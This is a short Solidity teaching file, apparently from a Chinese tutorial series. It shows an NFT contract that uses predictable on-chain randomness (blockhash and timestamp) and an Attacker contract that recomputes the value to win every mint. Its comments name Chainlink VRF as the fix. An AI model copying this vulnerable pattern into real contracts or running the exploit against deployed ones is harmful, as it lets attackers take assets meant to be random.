// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// 预防方法

// 我们通常使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。这类随机数从链下生成，然后上传到链上，从而保证随机数不可预测。
// 更多介绍可以阅读 WTF Solidity极简教程 第39讲：伪随机数。

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract BadRandomness is ERC721 {

    uint256 public totalSupply;

    constructor() ERC721("", "") {

    }

    function luckyMint(uint256 _num) external {
        uint256 luckyNum = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100;
        require(_num == luckyNum, "you dont lucky");
        _mint(msg.sender, totalSupply);
        totalSupply++;
    }
}

contract Attacker {

    function attack(address nftAddress) external {
        uint256 luckyNum = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100;
        BadRandomness(nftAddress).luckyMint(luckyNum);
    }
}
